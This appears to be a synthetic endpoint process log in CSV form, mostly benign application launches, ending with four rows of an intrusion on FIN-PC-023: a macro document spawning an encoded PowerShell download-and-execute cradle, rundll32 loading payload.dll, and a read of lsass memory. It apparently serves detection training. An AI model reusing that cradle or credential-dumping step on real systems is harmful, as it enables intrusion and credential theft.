timestamp,host,user,parent_process,process_name,command_line,hash,signature
2026-07-30 14:16:00,IT-PC-004,david.wilson,explorer.exe,teams.exe,teams.exe,b6391f04,Google LLC
2026-07-30 14:18:00,ENG-PC-019,daniel.thomas,explorer.exe,excel.exe,excel.exe,1f119c0f,Google LLC
2026-07-30 14:20:00,DC-SERVER-01,emily.davis,explorer.exe,code.exe,code.exe,06ba8cd3,Zoom Video Communications
2026-07-30 14:22:00,LEGAL-PC-006,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,77a7e8b7,Adobe Inc.
2026-07-30 14:24:00,DC-SERVER-01,ava.jackson,explorer.exe,outlook.exe,outlook.exe,10d4de39,Zoom Video Communications
2026-07-30 14:26:00,VPN-GW-01,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,6929de73,Slack Technologies
2026-07-30 14:28:00,FILE-SERVER-02,sarah.williams,explorer.exe,teams.exe,teams.exe,f8ede0ca,Zoom Video Communications
2026-07-30 14:30:00,HR-PC-008,sophia.anderson,explorer.exe,code.exe,code.exe,ae1b9f69,Adobe Inc.
2026-07-30 14:32:00,ENG-PC-019,michael.brown,explorer.exe,notepad.exe,notepad.exe,a3c988e4,Adobe Inc.
2026-07-30 14:34:00,DC-SERVER-01,michael.brown,explorer.exe,slack.exe,slack.exe,80bbae52,Microsoft
2026-07-30 14:36:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,4ddb1b36,Google LLC
2026-07-30 14:38:00,DC-SERVER-01,olivia.moore,explorer.exe,excel.exe,excel.exe,5894f7f1,Adobe Inc.
2026-07-30 14:40:00,IT-PC-004,sarah.williams,explorer.exe,explorer.exe,explorer.exe,3240d7a1,Adobe Inc.
2026-07-30 14:42:00,IT-PC-004,michael.brown,explorer.exe,explorer.exe,explorer.exe,9d4b2bf9,Adobe Inc.
2026-07-30 14:44:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,9780c215,Adobe Inc.
2026-07-30 14:46:00,DC-SERVER-01,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,b87b6384,Adobe Inc.
2026-07-30 14:48:00,ENG-PC-019,ava.jackson,explorer.exe,chrome.exe,chrome.exe,d342af08,Microsoft
2026-07-30 14:50:00,HR-PC-008,john.smith,explorer.exe,acrobat.exe,acrobat.exe,43c07d43,Google LLC
2026-07-30 14:52:00,FILE-SERVER-02,james.taylor,explorer.exe,acrobat.exe,acrobat.exe,a394ed54,Microsoft
2026-07-30 14:54:00,SALES-PC-002,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,a4540937,Zoom Video Communications
2026-07-30 14:56:00,SALES-PC-002,emily.davis,explorer.exe,slack.exe,slack.exe,4c24a053,Slack Technologies
2026-07-30 14:58:00,HR-PC-008,john.smith,explorer.exe,teams.exe,teams.exe,7089fc6d,Slack Technologies
2026-07-30 15:00:00,SALES-PC-002,sophia.anderson,explorer.exe,excel.exe,excel.exe,5716dc2e,Adobe Inc.
2026-07-30 15:02:00,DC-SERVER-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,bbf483ce,Zoom Video Communications
2026-07-30 15:04:00,VPN-GW-01,michael.brown,explorer.exe,onedrive.exe,onedrive.exe,83d5bceb,Adobe Inc.
2026-07-30 15:06:00,HR-PC-008,olivia.moore,explorer.exe,excel.exe,excel.exe,776abf09,Microsoft
2026-07-30 15:08:00,IT-PC-004,sophia.anderson,explorer.exe,excel.exe,excel.exe,24108e9a,Microsoft
2026-07-30 15:10:00,FIN-PC-023,david.wilson,explorer.exe,slack.exe,slack.exe,dd39d793,Adobe Inc.
2026-07-30 15:12:00,VPN-GW-01,emily.davis,explorer.exe,teams.exe,teams.exe,d0401587,Zoom Video Communications
2026-07-30 15:14:00,FILE-SERVER-02,olivia.moore,explorer.exe,excel.exe,excel.exe,c35bec2c,Google LLC
2026-07-30 15:16:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,7faeb748,Zoom Video Communications
2026-07-30 15:18:00,SALES-PC-002,john.smith,explorer.exe,outlook.exe,outlook.exe,f1fac6e7,Slack Technologies
2026-07-30 15:20:00,LEGAL-PC-006,sophia.anderson,explorer.exe,excel.exe,excel.exe,3713b466,Adobe Inc.
2026-07-30 15:22:00,ENG-PC-019,john.smith,explorer.exe,chrome.exe,chrome.exe,4806f804,Slack Technologies
2026-07-30 15:24:00,FILE-SERVER-02,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,896490ab,Microsoft
2026-07-30 15:26:00,HR-PC-008,james.taylor,explorer.exe,teams.exe,teams.exe,e1e89e7e,Zoom Video Communications
2026-07-30 15:28:00,ENG-PC-019,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,0b95017c,Slack Technologies
2026-07-30 15:30:00,FIN-PC-023,ava.jackson,explorer.exe,notepad.exe,notepad.exe,31d4ee09,Zoom Video Communications
2026-07-30 15:32:00,LEGAL-PC-006,david.wilson,explorer.exe,outlook.exe,outlook.exe,62e7c1a6,Adobe Inc.
2026-07-30 15:34:00,SALES-PC-002,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,d3479a3b,Adobe Inc.
2026-07-30 15:36:00,FILE-SERVER-02,sarah.williams,explorer.exe,teams.exe,teams.exe,f99f0704,Microsoft
2026-07-30 15:38:00,VPN-GW-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,8ece1128,Zoom Video Communications
2026-07-30 15:40:00,DC-SERVER-01,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,8255da61,Slack Technologies
2026-07-30 15:42:00,LEGAL-PC-006,john.smith,explorer.exe,chrome.exe,chrome.exe,09f64405,Google LLC
2026-07-30 15:44:00,ENG-PC-019,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,74fd33d1,Google LLC
2026-07-30 15:46:00,FILE-SERVER-02,daniel.thomas,explorer.exe,teams.exe,teams.exe,53f591dc,Adobe Inc.
2026-07-30 15:48:00,ENG-PC-019,michael.brown,explorer.exe,slack.exe,slack.exe,fd98fe33,Adobe Inc.
2026-07-30 15:50:00,IT-PC-004,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,81df6517,Adobe Inc.
2026-07-30 15:52:00,LEGAL-PC-006,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,4cbf131d,Slack Technologies
2026-07-30 15:54:00,FIN-PC-023,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,ac7e937c,Microsoft
2026-07-30 15:56:00,VPN-GW-01,ava.jackson,explorer.exe,explorer.exe,explorer.exe,cbf81f86,Microsoft
2026-07-30 15:58:00,FILE-SERVER-02,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,f791f1e5,Adobe Inc.
2026-07-30 16:00:00,FILE-SERVER-02,emily.davis,explorer.exe,chrome.exe,chrome.exe,9561c813,Slack Technologies
2026-07-30 16:02:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,c64c9647,Slack Technologies
2026-07-30 16:04:00,DC-SERVER-01,emily.davis,explorer.exe,chrome.exe,chrome.exe,9293f705,Microsoft
2026-07-30 16:06:00,FIN-PC-011,john.smith,explorer.exe,code.exe,code.exe,504e2687,Slack Technologies
2026-07-30 16:08:00,DC-SERVER-01,james.taylor,explorer.exe,excel.exe,excel.exe,690e7e62,Adobe Inc.
2026-07-30 16:10:00,FILE-SERVER-02,sophia.anderson,explorer.exe,chrome.exe,chrome.exe,b4adaf89,Google LLC
2026-07-30 16:12:00,LEGAL-PC-006,emily.davis,explorer.exe,notepad.exe,notepad.exe,5336723b,Slack Technologies
2026-07-30 16:14:00,LEGAL-PC-006,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,f4e95734,Google LLC
2026-07-30 16:16:00,SALES-PC-002,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,8bd88fcd,Zoom Video Communications
2026-07-30 16:18:00,IT-PC-004,ava.jackson,explorer.exe,code.exe,code.exe,31383975,Google LLC
2026-07-30 16:20:00,IT-PC-004,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,3990e2c9,Zoom Video Communications
2026-07-30 16:22:00,IT-PC-004,emily.davis,explorer.exe,code.exe,code.exe,5129950d,Slack Technologies
2026-07-30 16:24:00,ENG-PC-019,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,49ac9087,Microsoft
2026-07-30 16:26:00,FILE-SERVER-02,daniel.thomas,explorer.exe,slack.exe,slack.exe,e5508ea2,Slack Technologies
2026-07-30 16:28:00,ENG-PC-019,michael.brown,explorer.exe,explorer.exe,explorer.exe,0ac4de85,Zoom Video Communications
2026-07-30 16:30:00,HR-PC-008,olivia.moore,explorer.exe,code.exe,code.exe,a7edc8d8,Zoom Video Communications
2026-07-30 16:32:00,SALES-PC-002,emily.davis,explorer.exe,excel.exe,excel.exe,d3f4a49b,Adobe Inc.
2026-07-30 16:34:00,IT-PC-004,daniel.thomas,explorer.exe,explorer.exe,explorer.exe,23245211,Microsoft
2026-07-30 16:36:00,FILE-SERVER-02,ava.jackson,explorer.exe,excel.exe,excel.exe,3e11bafe,Microsoft
2026-07-30 16:38:00,LEGAL-PC-006,emily.davis,explorer.exe,excel.exe,excel.exe,0d700ea4,Microsoft
2026-07-30 16:40:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,19bd4f93,Google LLC
2026-07-30 16:42:00,FIN-PC-023,daniel.thomas,explorer.exe,teams.exe,teams.exe,682b163a,Slack Technologies
2026-07-30 16:44:00,SALES-PC-002,emily.davis,explorer.exe,explorer.exe,explorer.exe,52380bf2,Zoom Video Communications
2026-07-30 16:46:00,FIN-PC-023,sarah.williams,explorer.exe,acrobat.exe,acrobat.exe,3b72c86d,Adobe Inc.
2026-07-30 16:48:00,FIN-PC-023,michael.brown,explorer.exe,slack.exe,slack.exe,e1dace6a,Google LLC
2026-07-30 16:50:00,FIN-PC-023,james.taylor,explorer.exe,code.exe,code.exe,2fb21e66,Zoom Video Communications
2026-07-30 16:52:00,FIN-PC-023,john.smith,explorer.exe,explorer.exe,explorer.exe,9165f2ed,Adobe Inc.
2026-07-30 16:54:00,HR-PC-008,olivia.moore,explorer.exe,explorer.exe,explorer.exe,74503887,Adobe Inc.
2026-07-30 16:56:00,LEGAL-PC-006,sophia.anderson,explorer.exe,teams.exe,teams.exe,d9df0d0e,Adobe Inc.
2026-07-30 16:58:00,SALES-PC-002,david.wilson,explorer.exe,excel.exe,excel.exe,cf0e6d2b,Microsoft
2026-07-30 10:00:00,FIN-PC-023,john.smith,outlook.exe,winword.exe,"winword.exe /n ""C:\Users\john.smith\Downloads\invoice_update.docm""",a1b2c3d4e5f6,Microsoft
2026-07-30 10:05:00,FIN-PC-023,john.smith,winword.exe,powershell.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA,7ab92ff03ac91b7de4f812309abcc88e,Unknown
2026-07-30 10:08:00,FIN-PC-023,john.smith,powershell.exe,payload.dll (rundll32.exe),"rundll32.exe C:\Temp\payload.dll,DllMain",9af72bc1e4a83d9f6b21c7ea45d21f00,Unknown
2026-07-30 10:15:00,FIN-PC-023,SYSTEM,payload.dll,lsass_access.exe,internal memory read of lsass.exe (PID 712),9af72bc1e4a83d9f6b21c7ea45d21f00,Unknown
